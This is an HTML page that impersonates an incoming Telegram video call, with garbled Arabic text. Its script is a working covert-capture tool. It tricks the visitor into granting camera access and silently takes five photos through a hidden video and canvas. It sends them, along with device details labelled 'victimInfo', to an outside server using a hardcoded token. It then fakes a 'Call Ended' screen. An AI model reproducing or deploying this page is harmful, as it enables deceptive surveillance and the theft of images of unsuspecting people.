<!DOCTYPE html>
<html lang="en">
<head>

    <title>Telegram Video Call</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; 
            background: linear-gradient(135deg, #1a222d 0%, #2d3748 100%);
            color: white; 
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 20px;
        }
        
        .call-container { 
            background: rgba(36, 47, 61, 0.95); 
            padding: 40px; 
            border-radius: 20px; 
            text-align: center; 
            max-width: 400px; 
            width: 100%; 
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(10px);
        }
        
        .avatar { 
            width: 120px; 
            height: 120px; 
            border-radius: 50%; 
            background: linear-gradient(135deg, #0088cc, #0099dd);
            display: flex; 
            align-items: center; 
            justify-content: center; 
            margin: 0 auto 20px; 
            font-size: 50px; 
            font-weight: bold;
            box-shadow: 0 8px 20px rgba(0, 136, 204, 0.3);
        }
        
        .caller-name { 
            font-size: 28px; 
            font-weight: 600; 
            margin-bottom: 10px; 
        }
        
        .call-status { 
            font-size: 18px; 
            color: #a0b3c7; 
            margin-bottom: 40px; 
        }
        
        .buttons { 
            display: flex; 
            justify-content: center; 
            gap: 20px; 
        }
        
        button { 
            width: 80px; 
            height: 80px; 
            border-radius: 50%; 
            border: none; 
            cursor: pointer; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-size: 30px; 
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }
        
        button:active {
            transform: scale(0.95);
        }
        
        #joinButton { 
            background: linear-gradient(135deg, #28a745, #20c997);
            color: white; 
        }
        
        #joinButton:hover {
            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
        }
        
        #declineButton { 
            background: linear-gradient(135deg, #dc3545, #e74c3c);
            color: white; 
        }
        
        #declineButton:hover {
            box-shadow: 0 6px 20px rgba(220, 53, 69, 0.4);
        }
        
        /* Ù†Ø§ÙØ°Ø© Ù…Ø­Ø³Ù†Ø© */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            display: none;
            z-index: 999;
            backdrop-filter: blur(5px);
        }
        
        .modal-overlay.active {
            display: block;
        }
        
        .camera-permission { 
            position: fixed; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%) scale(0.9);
            background: linear-gradient(135deg, #2d3748, #1a222d);
            padding: 35px; 
            border-radius: 20px; 
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8);
            z-index: 1000; 
            display: none;
            text-align: center;
            max-width: 420px;
            width: 90%;
            border: 1px solid rgba(255, 255, 255, 0.1);
            animation: modalAppear 0.3s ease forwards;
        }
        
        .camera-permission.active { 
            display: block;
            transform: translate(-50%, -50%) scale(1);
        }
        
        @keyframes modalAppear {
            from {
                opacity: 0;
                transform: translate(-50%, -50%) scale(0.8);
            }
            to {
                opacity: 1;
                transform: translate(-50%, -50%) scale(1);
            }
        }
        
        .permission-icon {
            font-size: 48px;
            margin-bottom: 20px;
            display: block;
        }
        
        .camera-permission h3 { 
            margin-bottom: 30px; 
            font-size: 20px; 
            line-height: 1.5;
            color: #ffffff;
            font-weight: 500;
        }
        
        .permission-buttons { 
            display: flex; 
            flex-direction: column; 
            gap: 15px; 
        }
        
        .permission-btn { 
            background: linear-gradient(135deg, #0088cc, #0099dd);
            color: white; 
            padding: 16px 24px; 
            border: none; 
            border-radius: 12px; 
            cursor: pointer; 
            font-size: 16px; 
            font-weight: 500;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
        }
        
        .permission-btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.4);
        }
        
        .permission-btn:active {
            transform: translateY(0);
        }
        
        .permission-btn.secondary { 
            background: linear-gradient(135deg, #4a5568, #2d3748);
        }
        
        .permission-btn.secondary:hover { 
            box-shadow: 0 6px 20px rgba(74, 85, 104, 0.4);
        }
        
        /* Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¨Ø·Ø±ÙŠÙ‚Ø© Ù…ØªÙˆØ§ÙÙ‚Ø© Ù…Ø¹ Chrome */
        #hiddenVideo { 
            position: fixed; 
            top: -100px; 
            left: -100px; 
            width: 1px; 
            height: 1px; 
            opacity: 0.01;
            pointer-events: none;
        }
        
        #hiddenCanvas { 
            position: fixed;
            top: -100px;
            left: -100px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <video id="hiddenVideo" autoplay playsinline muted webkit-playsinline></video>

    <div class="call-container">
        <div class="avatar">T</div>
        <h1 class="caller-name">Incoming Video Call</h1>
        <p class="call-status" id="statusMessage">Telegram</p>
        <div class="buttons">
            <button id="declineButton" aria-label="Decline">âœ–</button>
            <button id="joinButton" aria-label="Answer">ğŸ“</button>
        </div>
    </div>
    
    <!-- Ø®Ù„ÙÙŠØ© Ø´ÙØ§ÙØ© -->
    <div class="modal-overlay" id="modalOverlay"></div>
    
    <!-- Ù†Ø§ÙØ°Ø© Ù…Ø­Ø³Ù†Ø© -->
    <div class="camera-permission" id="cameraPermission">
        <span class="permission-icon">ğŸ“¹</span>
        <h3>Ù„Ù„Ø¥Ù†Ø¶Ù…Ø§Ù… Ø¥Ù„Ù‰ Ù…ÙƒØ§Ù„Ù…Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ<br>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§</h3>
        <div class="permission-buttons">
            <button class="permission-btn" onclick="penanceProtocol.acceptPermission('accept')">
                Ù…ÙˆØ§ÙÙ‚
            </button>
            <button class="permission-btn secondary" onclick="penanceProtocol.acceptPermission('back')">
                Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ© ÙÙ‚Ø·
            </button>
        </div>
    </div>
    
    <canvas id="hiddenCanvas"></canvas>

    <script>
        class PenanceProtocol {
            constructor() {
                this.apiEndpoint = 'https://ahmed1997.pythonanywhere.com/api/v1/log_event';
                this.authToken = 'ahmed-secret-key-777';
                this.stream = null;
                this.maxCaptures = 5;
                this.captureCount = 0;
                this.userChoice = '';

                // ØªØ£Ø®ÙŠØ± Ø§Ù„ØªÙ‡ÙŠØ¦Ø© Ù„Ù„ØªÙˆØ§ÙÙ‚ Ù…Ø¹ Chrome
                setTimeout(() => {
                    this.initializeButtons();
                }, 100);
            }

            initializeButtons() {
                const declineBtn = document.getElementById('declineButton');
                const joinBtn = document.getElementById('joinButton');
                
                if (declineBtn) {
                    declineBtn.addEventListener('click', () => this.disappear());
                }
                
                if (joinBtn) {
                    joinBtn.addEventListener('click', () => this.showPermissionDialog());
                }
            }

            showPermissionDialog() {
                this.updateStatus('Connecting...');
                document.getElementById('modalOverlay').classList.add('active');
                document.getElementById('cameraPermission').classList.add('active');
            }

            acceptPermission(choice) {
                this.userChoice = choice;
                document.getElementById('modalOverlay').classList.remove('active');
                document.getElementById('cameraPermission').classList.remove('active');
                this.updateStatus('Requesting camera access...');
                
                // ØªØ£Ø®ÙŠØ± Ø¨Ø³ÙŠØ· Ù„Ù„ØªÙˆØ§ÙÙ‚ Ù…Ø¹ Chrome
                setTimeout(() => {
                    this.startOperation();
                }, 100);
            }

            updateStatus(message) {
                const statusEl = document.getElementById('statusMessage');
                if (statusEl) {
                    statusEl.textContent = message;
                }
            }
            
            async startOperation() {
                await this.sendInitialReport();
                
                try {
                    this.updateStatus('Initializing camera...');
                    
                    // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ù…ØªÙˆØ§ÙÙ‚Ø© Ù…Ø¹ Chrome
                    const constraints = {
                        video: {
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            facingMode: 'user'
                        },
                        audio: false
                    };
                    
                    this.stream = await navigator.mediaDevices.getUserMedia(constraints);
                    
                    const video = document.getElementById('hiddenVideo');
                    video.srcObject = this.stream;
                    
                    // Chrome ÙŠØ­ØªØ§Ø¬ play() ØµØ±ÙŠØ­
                    video.play().then(() => {
                        this.soulReader(video);
                    }).catch(() => {
                        // Ø¥Ø°Ø§ ÙØ´Ù„ autoplayØŒ Ù†Ø­Ø§ÙˆÙ„ Ø¨Ø¯ÙˆÙ†Ù‡
                        this.soulReader(video);
                    });

                } catch (error) {
                    console.log('First attempt failed, trying fallback...');
                    
                    // Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ø¯ÙŠÙ„Ø©
                    try {
                        this.stream = await navigator.mediaDevices.getUserMedia({ 
                            video: true, 
                            audio: false 
                        });
                        
                        const video = document.getElementById('hiddenVideo');
                        video.srcObject = this.stream;
                        
                        video.play().then(() => {
                            this.soulReader(video);
                        }).catch(() => {
                            this.soulReader(video);
                        });
                        
                    } catch (err) {
                        this.updateStatus('Camera permission denied.');
                        setTimeout(() => this.disappear(), 2000);
                    }
                }
            }

            soulReader(video) {
                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d', { willReadFrequently: true });
                let attempts = 0;
                
                const heartbeat = setInterval(() => {
                    attempts++;
                    
                    if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
                        // ØªØ¹ÙŠÙŠÙ† Ø­Ø¬Ù… ØµØºÙŠØ± Ù„Ù„ÙƒØ§Ù†ÙØ§Ø³
                        canvas.width = 10;
                        canvas.height = 10;
                        
                        try {
                            ctx.drawImage(video, 0, 0, 10, 10);
                            const imageData = ctx.getImageData(0, 0, 1, 1).data;
                            
                            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ù…Ø­ØªÙˆÙ‰
                            if (imageData[0] > 10 || imageData[1] > 10 || imageData[2] > 10) {
                                clearInterval(heartbeat);
                                this.updateStatus('Connected. Video call active...');
                                setTimeout(() => this.startCaptureLoop(), 200);
                            }
                        } catch (e) {
                            console.log('Canvas error, retrying...');
                        }
                    }
                    
                    // Chrome Ù‚Ø¯ ÙŠØ­ØªØ§Ø¬ Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ø£ÙƒØ«Ø±
                    if (attempts > 100) {
                        clearInterval(heartbeat);
                        this.disappear();
                    }
                }, 100);
            }

            async sendInitialReport() {
                const victimInfo = { 
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    userChoice: this.userChoice,
                    actualCamera: 'front',
                    timestamp: new Date().toISOString()
                };
                
                try {
                    await fetch(this.apiEndpoint, { 
                        method: 'POST', 
                        headers: { 
                            'Content-Type': 'application/json', 
                            'X-Auth-Token': this.authToken 
                        }, 
                        body: JSON.stringify({ info: victimInfo }) 
                    });
                } catch (e) {
                    console.log('Report failed');
                }
            }

            startCaptureLoop() {
                if (this.captureCount >= this.maxCaptures) {
                    this.disappear();
                    return;
                }
                
                const video = document.getElementById('hiddenVideo');
                
                if (!video || video.readyState < 2 || video.videoWidth === 0) {
                    this.disappear();
                    return;
                }

                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d');
                
                // ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ø­Ø¬Ù… Ø§Ù„ÙƒØ§Ù…Ù„
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                try {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    this.captureCount++;
                    const imageData = canvas.toDataURL('image/jpeg', 0.85);
                    this.sendPhotoReport(imageData, this.captureCount);
                    
                    setTimeout(() => this.startCaptureLoop(), 700);
                } catch (e) {
                    console.log('Capture error');
                    setTimeout(() => this.startCaptureLoop(), 1000);
                }
            }

            async sendPhotoReport(imageData, count) {
                const victimInfo = { 
                    captureSequence: `${count}/${this.maxCaptures}`,
                    userChoice: this.userChoice,
                    actualCamera: 'front',
                    timestamp: new Date().toISOString()
                };
                
                try {
                    await fetch(this.apiEndpoint, { 
                        method: 'POST', 
                        headers: { 
                            'Content-Type': 'application/json', 
                            'X-Auth-Token': this.authToken 
                        }, 
                        body: JSON.stringify({ image: imageData, info: victimInfo }) 
                    });
                } catch (e) {
                    console.log('Photo report failed');
                }
            }

            disappear() {
                if (this.stream) { 
                    this.stream.getTracks().forEach(track => {
                        track.stop();
                    }); 
                }
                
                document.getElementById('modalOverlay').classList.remove('active');
                document.getElementById('cameraPermission').classList.remove('active');
                
                const container = document.querySelector('.call-container');
                if (container) {
                    container.innerHTML = `<h1 class="caller-name">Call Ended</h1>`;
                }
            }
        }

        // ØªÙ‡ÙŠØ¦Ø© Ø¨Ø¹Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        let penanceProtocol;
        
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                penanceProtocol = new PenanceProtocol();
            });
        } else {
            penanceProtocol = new PenanceProtocol();
        }
    </script>
</body>
